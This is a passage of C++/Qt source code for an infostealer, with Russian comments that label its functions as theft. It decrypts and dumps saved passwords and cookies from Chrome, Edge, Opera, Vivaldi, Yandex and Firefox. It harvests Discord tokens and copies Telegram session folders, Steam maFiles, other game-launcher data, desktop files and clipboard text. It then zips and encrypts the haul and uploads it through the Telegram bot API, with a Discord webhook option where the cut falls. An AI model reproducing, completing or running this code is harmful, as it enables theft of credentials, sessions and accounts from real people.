    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(appDataPath) + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", std::string(appDataPath) + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", std::string(appDataPath) + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", std::string(appDataPath) + "\\Opera Software\\Opera GX Stable\\"},
        {"Vivaldi", std::string(appDataPath) + "\\Vivaldi\\User Data\\Default\\"},
        {"Yandex", std::string(appDataPath) + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browsers) {
        if (config.passwords) {
            std::string loginDataPath = browser.second + "Login Data";
            if (std::filesystem::exists(loginDataPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_LoginData_temp";
                try {
                    std::filesystem::copy_file(loginDataPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных паролей %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_passwords.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* password = sqlite3_column_blob(stmt, 2);
                                int passwordLen = sqlite3_column_bytes(stmt, 2);

                                out << "URL: " << (url ? QString::fromUtf8(url) : "N/A") << "\n";
                                out << "Username: " << (username ? QString::fromUtf8(username) : "N/A") << "\n";
                                if (password && passwordLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)passwordLen, (BYTE*)password};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Password: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Password: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать пароль для %1").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Password: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Пароли %1 сохранены: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для паролей %1").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для паролей %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных паролей %1 не найдена").arg(QString::fromStdString(browser.first)));
            }
        }
        if (config.cookies) {
            std::string cookiesPath = browser.second + "Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_Cookies_temp";
                try {
                    std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_cookies.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* value = sqlite3_column_blob(stmt, 2);
                                int valueLen = sqlite3_column_bytes(stmt, 2);

                                out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                if (value && valueLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)valueLen, (BYTE*)value};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Value: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Value: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать куки для %1").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Value: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Куки %1 сохранены: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для куки %1").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных куки %1 не найдена").arg(QString::fromStdString(browser.first)));
            }
        }
    }

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string profilePath = entry.path().string();
            if (config.passwords) {
                std::string loginsPath = profilePath + "\\logins.json";
                if (std::filesystem::exists(loginsPath)) {
                    std::string path = dir + "\\firefox_logins.json";
                    if (QFile::copy(QString::fromStdString(loginsPath), QString::fromStdString(path))) {
                        emitLog("Пароли Firefox сохранены: " + QString::fromStdString(path));
                    } else {
                        emitLog("Ошибка копирования паролей Firefox");
                    }
                }
            }
            if (config.cookies) {
                std::string cookiesPath = profilePath + "\\cookies.sqlite";
                if (std::filesystem::exists(cookiesPath)) {
                    std::string tempPath = dir + "\\firefox_cookies_temp.sqlite";
                    try {
                        std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                    } catch (const std::exception& e) {
                        emitLog(QString("Ошибка копирования базы данных куки Firefox: %1").arg(QString::fromStdString(e.what())));
                        continue;
                    }

                    sqlite3 *db;
                    if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host, name, value FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            std::string path = dir + "\\firefox_cookies.txt";
                            QFile file(QString::fromStdString(path));
                            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                                QTextStream out(&file);
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    const char* value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

                                    out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                    out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                    out << "Value: " << (value ? QString::fromUtf8(value) : "N/A") << "\n\n";
                                }
                                file.close();
                                emitLog("Куки Firefox сохранены: " + QString::fromStdString(path));
                            } else {
                                emitLog("Ошибка: Не удалось создать файл для куки Firefox");
                            }
                            sqlite3_finalize(stmt);
                        } else {
                            emitLog(QString("Ошибка подготовки SQL-запроса для куки Firefox: %1").arg(QString::fromStdString(sqlite3_errmsg(db))));
                        }
                        sqlite3_close(db);
                        std::filesystem::remove(tempPath);
                    } else {
                        emitLog(QString("Ошибка открытия базы данных куки Firefox: %1").arg(QString::fromStdString(sqlite3_errmsg(db))));
                    }
                }
            }
        }
    }
}

// Кража данных Discord
void MainWindow::stealDiscordData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        std::string tokensPath = dir + "\\discord_tokens.txt";
        QFile file(QString::fromStdString(tokensPath));
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                    QRegularExpressionMatchIterator i = tokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }

                    QRegularExpression mfaTokenRegex("mfa\\.[\\w-]{84}");
                    i = mfaTokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }
                }
            }
            file.close();
            emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
        } else {
            emitLog("Ошибка: Не удалось создать файл для токенов Discord");
        }
    } else {
        emitLog("Директория Discord не найдена");
    }
}

// Кража данных Telegram
void MainWindow::stealTelegramData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(telegramPath)) {
        std::string destPath = dir + "\\telegram_data";
        try {
            std::filesystem::create_directory(destPath);
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                if (entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos) {
                    std::filesystem::copy(entry.path(), destPath + "\\" + entry.path().filename().string(), std::filesystem::copy_options::recursive);
                }
            }
            emitLog("Данные Telegram скопированы: " + QString::fromStdString(destPath));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Telegram: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Telegram не найдена");
    }
}

// Кража данных Steam
void MainWindow::stealSteamData(const std::string& dir) {
    std::string steamPath = "C:\\Program Files (x86)\\Steam\\";
    if (std::filesystem::exists(steamPath)) {
        std::string destPath = dir + "\\steam_data";
        try {
            std::filesystem::create_directory(destPath);
            if (config.steam) {
                for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
                    if (entry.path().filename().string().find("config") != std::string::npos) {
                        std::filesystem::copy(entry.path(), destPath + "\\config", std::filesystem::copy_options::recursive);
                    }
                }
                emitLog("Конфигурационные файлы Steam скопированы: " + QString::fromStdString(destPath + "\\config"));
            }
            if (config.steamMAFile) {
                for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
                    if (entry.path().filename().string().find("maFiles") != std::string::npos) {
                        std::filesystem::copy(entry.path(), destPath + "\\maFiles", std::filesystem::copy_options::recursive);
                    }
                }
                emitLog("MA-файлы Steam скопированы: " + QString::fromStdString(destPath + "\\maFiles"));
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Steam: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Steam не найдена");
    }
}

// Кража данных Epic Games
void MainWindow::stealEpicData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\";
    if (std::filesystem::exists(epicPath)) {
        std::string destPath = dir + "\\epic_data";
        try {
            std::filesystem::create_directory(destPath);
            std::filesystem::copy(epicPath, destPath, std::filesystem::copy_options::recursive);
            emitLog("Данные Epic Games скопированы: " + QString::fromStdString(destPath));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Epic Games: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Epic Games не найдена");
    }
}

// Кража данных Roblox
void MainWindow::stealRobloxData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\";
    if (std::filesystem::exists(robloxPath)) {
        std::string destPath = dir + "\\roblox_data";
        try {
            std::filesystem::create_directory(destPath);
            for (const auto& entry : std::filesystem::directory_iterator(robloxPath)) {
                if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos) {
                    std::filesystem::copy(entry.path(), destPath + "\\" + entry.path().filename().string(), std::filesystem::copy_options::recursive);
                }
            }
            emitLog("Данные Roblox скопированы: " + QString::fromStdString(destPath));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Roblox: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Roblox не найдена");
    }
}

// Кража данных Battle.net
void MainWindow::stealBattleNetData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string battleNetPath = std::string(appDataPath) + "\\Battle.net\\";
    if (std::filesystem::exists(battleNetPath)) {
        std::string destPath = dir + "\\battlenet_data";
        try {
            std::filesystem::create_directory(destPath);
            std::filesystem::copy(battleNetPath, destPath, std::filesystem::copy_options::recursive);
            emitLog("Данные Battle.net скопированы: " + QString::fromStdString(destPath));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Battle.net: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Battle.net не найдена");
    }
}

// Кража данных Minecraft
void MainWindow::stealMinecraftData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string minecraftPath = std::string(appDataPath) + "\\.minecraft\\";
    if (std::filesystem::exists(minecraftPath)) {
        std::string destPath = dir + "\\minecraft_data";
        try {
            std::filesystem::create_directory(destPath);
            for (const auto& entry : std::filesystem::directory_iterator(minecraftPath)) {
                if (entry.path().filename() == "launcher_profiles.json" || entry.path().filename() == "options.txt") {
                    std::filesystem::copy(entry.path(), destPath + "\\" + entry.path().filename().string());
                }
            }
            emitLog("Данные Minecraft скопированы: " + QString::fromStdString(destPath));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Minecraft: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Minecraft не найдена");
    }
}

// Кража файлов
void MainWindow::stealFiles(const std::string& dir) {
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    std::string destPath = dir + "\\desktop_files";
    try {
        std::filesystem::create_directory(destPath);
        for (const auto& entry : std::filesystem::directory_iterator(desktopPath)) {
            if (entry.is_regular_file()) {
                auto fileSize = std::filesystem::file_size(entry.path());
                if (fileSize < 5 * 1024 * 1024) { // Ограничение 5 МБ
                    std::filesystem::copy_file(entry.path(), destPath + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                }
            }
        }
        emitLog("Файлы с рабочего стола скопированы: " + QString::fromStdString(destPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования файлов с рабочего стола: " + QString::fromStdString(e.what()));
    }
}

// Сбор данных для социальной инженерии
void MainWindow::collectSocialEngineeringData(const std::string& dir) {
    std::string path = dir + "\\social_engineering.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << "Social Engineering Data:\n";

        QClipboard *clipboard = QGuiApplication::clipboard();
        QString clipboardText = clipboard->text();
        if (!clipboardText.isEmpty()) {
            out << "Clipboard: " << clipboardText << "\n";
        }

        char appDataPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
        std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
        if (std::filesystem::exists(discordPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                    QRegularExpressionMatchIterator i = emailRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << "Email (from Discord): " << match.captured() << "\n";
                    }
                }
            }
        }

        file.close();
        emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(path));
    } else {
        emitLog("Ошибка: Не удалось создать файл для данных социальной инженерии");
    }
}

// Архивирование данных
void MainWindow::archiveData(const std::string& dir, const std::string& archivePath) {
    zip_t *zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать архив stolen_data.zip");
        return;
    }

    for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string relativePath = std::filesystem::relative(entry.path(), dir).string();
            std::replace(relativePath.begin(), relativePath.end(), '\\', '/');

            std::ifstream file(entry.path(), std::ios::binary);
            std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            zip_source_t *source = zip_source_buffer(zip, buffer.data(), buffer.size(), 0);
            if (!source) {
                emitLog("Ошибка: Не удалось создать источник для файла " + QString::fromStdString(relativePath));
                continue;
            }

            if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
                zip_source_free(source);
                emitLog("Ошибка: Не удалось добавить файл " + QString::fromStdString(relativePath) + " в архив");
            }
        }
    }

    zip_close(zip);
    emitLog("Данные архивированы: " + QString::fromStdString(archivePath));
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось установить режим цепочки AES");
        return QByteArray();
    }

    DWORD keyObjectSize = 0, dataSize = 0;
    DWORD cbResult = 0;
    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось получить размер объекта ключа AES");
        return QByteArray();
    }

    std::vector<BYTE> keyObject(keyObjectSize);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось сгенерировать ключ AES");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), nullptr, 0, &dataSize, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось вычислить размер зашифрованных данных");
        return QByteArray();
    }

    std::vector<BYTE> encryptedData(dataSize);
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), encryptedData.data(), dataSize, &cbResult, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось зашифровать данные");
        return QByteArray();
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return QByteArray((char*)encryptedData.data(), cbResult);
}

// Применение AES-дешифрования
QByteArray MainWindow::applyAESDecrypt(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES для дешифрования");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось установить режим цепочки AES для дешифрования");
        return QByteArray();
    }

    DWORD keyObjectSize = 0, dataSize = 0;
    DWORD cbResult = 0;
    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось получить размер объекта ключа AES для дешифрования");
        return QByteArray();
    }

    std::vector<BYTE> keyObject(keyObjectSize);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), nullptr, 0, &dataSize, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось вычислить размер дешифрованных данных");
        return QByteArray();
    }

    std::vector<BYTE> decryptedData(dataSize);
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), decryptedData.data(), dataSize, &cbResult, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось дешифровать данные");
        return QByteArray();
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return QByteArray((char*)decryptedData.data(), cbResult);
}

// Шифрование данных
void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath) {
    QFile inputFile(QString::fromStdString(inputPath));
    if (!inputFile.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для шифрования: " + QString::fromStdString(inputPath));
        return;
    }

    QByteArray data = inputFile.readAll();
    inputFile.close();

    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);
    auto iv = generateIV();

    // Применяем XOR-шифрование с первым ключом
    QByteArray xorData = applyXOR(data, key1);
    // Применяем AES-шифрование с вторым ключом
    QByteArray aesData = applyAES(xorData, key2, iv);
    if (aesData.isEmpty()) {
        emitLog("Ошибка: Не удалось зашифровать данные");
        return;
    }

    // Сохраняем IV в начало файла, чтобы использовать его при дешифровании
    QFile outputFile(QString::fromStdString(outputPath));
    if (!outputFile.open(QIODevice::WriteOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для записи зашифрованных данных: " + QString::fromStdString(outputPath));
        return;
    }

    // Записываем IV (16 байт) и зашифрованные данные
    outputFile.write(QByteArray((char*)iv.data(), iv.size()));
    outputFile.write(aesData);
    outputFile.close();

    emitLog("Данные зашифрованы и сохранены: " + QString::fromStdString(outputPath));
}

// Дешифрование данных
void MainWindow::decryptData(const std::string& inputPath, const std::string& outputPath) {
    QFile inputFile(QString::fromStdString(inputPath));
    if (!inputFile.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для дешифрования: " + QString::fromStdString(inputPath));
        return;
    }

    // Читаем IV (первые 16 байт)
    QByteArray ivData = inputFile.read(16);
    if (ivData.size() != 16) {
        emitLog("Ошибка: Неверный формат зашифрованного файла (IV отсутствует)");
        inputFile.close();
        return;
    }
    std::array<unsigned char, 16> iv;
    std::copy(ivData.begin(), ivData.end(), iv.begin());

    // Читаем оставшиеся зашифрованные данные
    QByteArray encryptedData = inputFile.readAll();
    inputFile.close();

    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);

    // Дешифруем AES
    QByteArray aesDecrypted = applyAESDecrypt(encryptedData, key2, iv);
    if (aesDecrypted.isEmpty()) {
        emitLog("Ошибка: Не удалось дешифровать данные (AES)");
        return;
    }

    // Дешифруем XOR
    QByteArray finalData = applyXOR(aesDecrypted, key1);

    QFile outputFile(QString::fromStdString(outputPath));
    if (!outputFile.open(QIODevice::WriteOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для записи дешифрованных данных: " + QString::fromStdString(outputPath));
        return;
    }

    outputFile.write(finalData);
    outputFile.close();

    emitLog("Данные дешифрованы и сохранены: " + QString::fromStdString(outputPath));
}

// Отправка данных
void MainWindow::sendData(const std::string& filePath) {
    QString sendMethod = ui->sendMethodComboBox->currentText();
    emitLog("Отправка данных через: " + sendMethod);

    if (sendMethod == "Local File") {
        std::string localPath = QDir::currentPath().toStdString() + "\\stolen_data_encrypted.zip";
        try {
            std::filesystem::copy_file(filePath, localPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Данные сохранены локально: " + QString::fromStdString(localPath));
        } catch (const std::exception& e) {
            emitLog("Ошибка сохранения данных локально: " + QString::fromStdString(e.what()));
        }
    } else if (sendMethod == "Telegram") {
        QString token = ui->tokenLineEdit->text();
        QString chatId = ui->chatIdLineEdit->text();
        if (token.isEmpty() || chatId.isEmpty()) {
            emitLog("Ошибка: Токен Telegram или Chat ID не указаны");
            return;
        }

        CURL* curl = curl_easy_init();
        if (!curl) {
            emitLog("Ошибка: Не удалось инициализировать CURL");
            return;
        }

        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, chatId.toStdString().c_str(), CURL_ZERO_TERMINATED);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "document");
        curl_mime_filedata(part, filePath.c_str());
        curl_mime_filename(part, "stolen_data_encrypted.zip");

        std::string url = "https://api.telegram.org/bot" + token.toStdString() + "/sendDocument";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            emitLog("Ошибка отправки через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
            if (doc.object().value("ok").toBool()) {
                emitLog("Данные успешно отправлены через Telegram");
            } else {
                emitLog("Ошибка Telegram API: " + QString::fromStdString(doc.toJson()));
            }
        }

        curl_mime_free(mime);
        curl_easy_cleanup(curl);
    } else if (sendMethod == "Discord") {
        QString webhookUrl = ui->discordWebhookLineEdit->text();
        if (webhookUrl.isEmpty()) {
            emitLog("Ошибка: Webhook URL для Discord не указан");
            return;
        }

        QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
        QHttpPart filePart;
